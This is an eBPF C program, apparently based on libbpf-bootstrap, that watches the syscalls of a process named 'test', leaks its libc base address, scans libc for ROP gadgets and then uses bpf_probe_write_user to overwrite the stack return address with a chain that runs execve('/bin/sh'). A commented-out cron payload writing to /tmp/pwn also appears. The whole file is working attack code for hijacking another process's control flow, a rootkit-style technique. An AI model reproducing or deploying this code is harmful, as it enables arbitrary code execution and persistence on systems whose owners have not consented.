//based on libbpf-bootstrap, libc-2.31

//#define BPF_NO_PRESERVE_ACCESS_INDEX
#include "./vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
//#include <bpf/bpf_core_read.h>


#define TASK_COMM_LEN 0x10
/* Global Var */
ssize_t libc_base = 0;
int my_pid = 0;
char filename_saved[65]={0};
char openat_filename_saved[0x40]={0};
void* read_buf_ptr = NULL;
struct stat * statbuf_fstat_ptr=NULL;
int open_fd=0;
//char PAYLOAD[]  = "* * * * * root /bin/bash -c 'date > /tmp/pwn' \n #";
int read_fd=0;
int jump_flag = 0;

/* ****************************** Deceleration Begin ****************************** */
/* Another Helpers */
static __inline int memcmp(const void* s1, const void* s2, size_t cnt);
static __inline void *memcpy(void* dest, const void* src, size_t count);
/* Enter Operation */
static __inline int handle_enter_read(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_close(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_stat(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_fstat(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_openat(struct bpf_raw_tracepoint_args *ctx);



/* Exit Hook Operation */
static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_exit_stat();
static __inline int handle_exit_fstat();
static __inline int handle_exit_openat(struct bpf_raw_tracepoint_args *ctx);
/* ****************************** Deceleration Over ****************************** */


/* ****************************** Implement Begin ****************************** */

static __inline int memcmp(const void* s1, const void* s2, size_t cnt){

  const char *t1 = s1;
  const char *t2 = s2;

  int res = 0;
  while(cnt-- > 0){
    if(*t1 > *t2){
      res =1;
      break;
    }
    else if(*t1 < *t2){
      res = -1;
      break;
    }
    else{
      t1++;
      t2++;
    }
  }

  return res;
}
static __inline void *memcpy(void* dest, const void* src, size_t count)
{


       char* pdest =(char*) dest;

       const char* psrc =(const char*) src;

       if (psrc > pdest || pdest >= psrc + count)

       {

              while (count--)

              *pdest++ = *psrc++;

       }

       else

       {

               while (count--)

               {

                     *(pdest + count) = *(psrc + count);

              }

       }

return dest;

}

char binsh[] = "/bin/sh\x00";
// read(int fd, void *buf, size_t count);
static __inline int handle_enter_read(struct bpf_raw_tracepoint_args *ctx){
  int pid=0;
  pid = bpf_get_current_pid_tgid() & 0xffffffff;
  struct pt_regs *regs;
  char buf[0x40];
  char *pathname ;
  int fd=0;
  int read_size = 0;
  char *rbp;
  regs = (struct pt_regs *)(ctx->args[0]);
  //fd = PT_REGS_PARM1_CORE(regs);
  bpf_probe_read(&fd, sizeof(fd) , &regs->di);
  bpf_probe_read(&read_size, sizeof(read_size), &regs->dx);
  if(read_size != 0x10)
	  return 0;
    
  bpf_probe_read(&read_buf_ptr , sizeof(read_buf_ptr) , &regs->si);
  int read_offset = 0x10; // we need to skip a little bit from read point, avoid being overwrited.
  bpf_probe_write_user((char *)read_buf_ptr+read_offset, binsh, 0x8); 


  bpf_probe_read(&rbp, sizeof(rbp), &regs->bp);
  
  // here you need to set and dump your own gadgets in a small memory address space.
  // and inject by bpf write to the stack.
  size_t start_offset = 0x22000;
  size_t end_offset = 0x178000;
  size_t start_addr = libc_base+start_offset;
  size_t end_addr = libc_base+end_offset;

  size_t pop_rdi_ret = 0xc35f; size_t pop_rdi_ret_addr = 0;
  size_t pop_rsi_ret = 0xc35e; size_t pop_rsi_ret_addr = 0;
  size_t pop_rdx_ret = 0xc35a; size_t pop_rdx_ret_addr = 0;
  size_t pop_rax_ret = 0xc358; size_t pop_rax_ret_addr = 0;
  size_t syscall = 0x050f;     size_t call_syscall_addr = 0;
  size_t xor_rsi_rsi = 0xf631;
  size_t xor_rdx_rdx = 0xd231;

  size_t dump_length = 0x20b760;

  size_t start_addr_rdi = start_addr + 0x2c83;
  size_t start_addr_rsi = start_addr + 0xf08ca;
  size_t start_addr_rdx = start_addr + 0xa30;
  size_t start_addr_rax = start_addr + 0xf1517;
  size_t start_addr_syscall = start_addr + 0xa41-0x80;
  int cnt = 0x80;
  unsigned char gadgets_target[0x10];
  size_t rdi_addr=0;size_t rsi_addr=0;size_t rdx_addr=0;size_t rax_addr=0;size_t syscall_addr=0;


  while(cnt-- > 0){
    rdi_addr = start_addr_rdi+1*(0x100-cnt)-1;
    rsi_addr = start_addr_rsi+1*(0x100-cnt)-1;
    rdx_addr = start_addr_rdx+1*(0x100-cnt)-1;
    rax_addr = start_addr_rax+1*(0x100-cnt)-1;
    syscall_addr = start_addr_syscall+1*(0x100-cnt)-1;
    bpf_probe_read(&gadgets_target[0],0x2,(char *)rdi_addr);	// pop rdi;ret
    bpf_probe_read(&gadgets_target[2],0x2,(char *)rsi_addr);	// pop rsi;ret
    bpf_probe_read(&gadgets_target[4],0x2,(char *)rdx_addr);	// pop rdx;ret
    bpf_probe_read(&gadgets_target[6],0x2,(char *)rax_addr);	// pop rax;ret
    bpf_probe_read(&gadgets_target[8],0x2,(char *)syscall_addr);	// syscall

    
    if (*(unsigned short *)&gadgets_target[0] == 0xc35f) {
    	pop_rdi_ret_addr = rdi_addr;
    } 
    if (*(unsigned short *)&gadgets_target[2] == 0xc35e) {
    	pop_rsi_ret_addr = rsi_addr;
    } 
    if (*(unsigned short *)&gadgets_target[4] == 0xd231) {
    	pop_rdx_ret_addr = rdx_addr;		// actually is xor edx, edx
    } 
    if (*(unsigned short *)&gadgets_target[6] == 0xc358) {
    	pop_rax_ret_addr = rax_addr;
    } 
    if (*(unsigned short *)&gadgets_target[8] == 0x50f) {
    	call_syscall_addr = syscall_addr;
    }
  }

  size_t PAYLOAD = libc_base + 0xe3b01;	//address of `one_gadget` in libc 
  unsigned long execve_syscall_num = 59;	
  unsigned long write_syscall_num = 1;
  unsigned long std_out = 1;
  unsigned long big_dump_length = 0x10000;
  unsigned long zero = 0;
  char *binsh_addr = read_buf_ptr + read_offset;
  //bpf_probe_write_user((rbp+8), &PAYLOAD, sizeof(PAYLOAD));
  bpf_probe_write_user((rbp+0x8)  , &pop_rdi_ret_addr, 0x8);	 // return addr => pop rdi;ret;
  //bpf_probe_write_user((rbp+0x10) , &binsh_addr, 0x8);  // addr of `/bin/sh`
  bpf_probe_write_user((rbp+0x10) , &binsh_addr, 0x8); 
  bpf_probe_write_user((rbp+0x18) , &pop_rsi_ret_addr, 0x8);  // pop rsi;ret
  bpf_probe_write_user((rbp+0x20) , &zero, 0x8);  // 0
  //bpf_probe_write_user((rbp+0x28) , &pop_rdx_ret_addr, 0x8);	 // pop rdx;ret
  //bpf_probe_write_user((rbp+0x30) , &zero, 0x8);	 // 0
  bpf_probe_write_user((rbp+0x28) , &pop_rax_ret_addr, 0x8); // pop rax;ret
  bpf_probe_write_user((rbp+0x30) , &execve_syscall_num, 0x8); // syscall_number
  bpf_probe_write_user((rbp+0x38) , &call_syscall_addr, 0x8); // `syscall`

  //bpf_printk("NOW dump libc gadgets in: 0x%lx ~ 0x%lx\n",start_addr,end_addr);
  //bpf_printk("[sys_enter::handle_enter_read] fd is %d\n",fd);
  //bpf_printk("hijack down, return address: 0x%lx\n",rbp+8);
  return 0;
}


static __inline int handle_enter_close(struct bpf_raw_tracepoint_args *ctx){

  //bpf_printk("[sys_enter::handle_enter_close] close()\n");
  return 0;
}
/*

https://lore.kernel.org/bpf/20200313172336.1879637-4-andriin@fb.com/
https://github.com/time-river/Linux-eBPF-Learning/tree/main/4-CO-RE
https://vvl.me/2021/02/eBPF-2-example-openat2/

*/

// int fstat(int fd, struct stat *statbuf);
static __inline int handle_enter_fstat(struct bpf_raw_tracepoint_args *ctx){


  struct pt_regs *regs;
  char buf[0x40];
  char *pathname ;
  int fd=0;

  regs = (struct pt_regs *)(ctx->args[0]);
  //fd = PT_REGS_PARM1_CORE(regs);
  bpf_probe_read(&fd , sizeof(fd) , &regs->di);
  if(fd != open_fd){
    return 0;
  }
  bpf_probe_read(&statbuf_fstat_ptr , sizeof(statbuf_fstat_ptr) , &regs->si);
  return 0;
}
 char LIBC[] = "/lib/x86_64-linux-gnu/libc.so.6";

// int openat(int  dirfd , const char * pathname
//int openat_flag = 0;
static __inline int handle_enter_openat(struct bpf_raw_tracepoint_args *ctx) {
  struct pt_regs *regs;
	char buf[0x40];
	char *pathname ;

	regs = (struct pt_regs *)(ctx->args[0]);
  //pathname = (char *)PT_REGS_PARM2_CORE(regs);
  bpf_probe_read(&pathname , sizeof(pathname) , &regs->si);
  bpf_probe_read_str(buf,sizeof(buf),pathname);

   // Check if open LIBC
   if(memcmp(buf , LIBC , sizeof(LIBC))){
		return 0;
  }
  //bpf_printk("We Got it: %s\n",buf);

  // Save to openat_filename_saved
  memcpy(openat_filename_saved , buf , 64);
  return 0;
}

int check_libc_base = 0;
static __inline int handle_enter_mmap(struct bpf_raw_tracepoint_args *ctx) {

	struct pt_regs *regs;
	
	regs = (struct pt_regs *)(ctx->args[0]);


	int r8=0;
	bpf_probe_read(&r8, sizeof(r8), &regs->r8);

	if (r8 != open_fd) {
		return 0;
	}

	check_libc_base = 1;
	//bpf_printk("mmap fd: %d\n",r8);

}

int skip_mmap = 0;
static __inline int handle_exit_mmap(struct bpf_raw_tracepoint_args *ctx) {

	if (check_libc_base != 1 || skip_mmap == 1)
		return 0;

	struct pt_regs *regs;
	
	regs = (struct pt_regs *)(ctx->args[0]);

//	ssize_t ret = ctx->args[1];
	
	libc_base = ctx->args[1];

	check_libc_base = 0;
	skip_mmap = 1;
	bpf_printk("mmap leak libc base addr: 0x%lx\n",libc_base);
  

}
            //handle_enter_mmap(ctx);
/* ****************************** Implement Over ****************************** */


#define TARGET_NAME "test" // assume we want to hijack process "test"
SEC("raw_tracepoint/sys_enter")
int raw_tp_sys_enter(struct bpf_raw_tracepoint_args *ctx)
{
    unsigned long syscall_id = ctx->args[1];
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME))){
        return 0;
    }
    switch (syscall_id)
    {
        case 0:
            handle_enter_read(ctx);
            break;
        case 3:  // close
            //handle_enter_close(ctx);
            break;
        case 4:
            //handle_enter_stat(ctx);
            break;
        case 5:
            //handle_enter_fstat(ctx);
            break;
	case 9:
            handle_enter_mmap(ctx);
	    break;
	case 257:
            handle_enter_openat(ctx);
            break;
        default:
            //bpf_printk("None of targets , break");
            return 0;
    }
    return 0;
}

SEC("raw_tracepoint/sys_exit")
int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx)
{

  unsigned int id=0;
  struct pt_regs *regs;
    int pid = bpf_get_current_pid_tgid() & 0xffffffff;
  
  regs = (struct pt_regs *)(ctx->args[0]);
  // Read syscall_id from orig_ax
  //bpf_probe_read_kernel(&id, sizeof(id), regs->orig_ax);
  //id = BPF_CORE_READ(regs,orig_ax);
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));

  if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME))){
        return 0;
    }

  bpf_probe_read(&id, sizeof(id) , &regs->orig_ax);
  switch (id)
    {
        case 0:
            //handle_exit_read(ctx);
            break;
        case 4:
            //handle_exit_stat();
            break;
        case 5:
            //handle_exit_fstat();
            break;
	case 9:
            handle_exit_mmap(ctx);
	    break;
        case 257:
            handle_exit_openat(ctx);
            break;
        default:
            return 0;
    }

  return 0;
}



static __inline int handle_exit_openat(struct bpf_raw_tracepoint_args *ctx){
   if(openat_filename_saved[0]==0){
    return 0;
  }
  // Ensure we open LIBC
  if(!memcmp(openat_filename_saved , LIBC , sizeof(LIBC)))
  {
    // save the corresponding file descriptor
    open_fd = ctx->args[1];
    bpf_printk("openat: %s, fd: %d\n",openat_filename_saved , open_fd);
    openat_filename_saved[0] = '\0';
  }
  return 0;
}
char LICENSE[] SEC("license") = "Dual BSD/GPL";
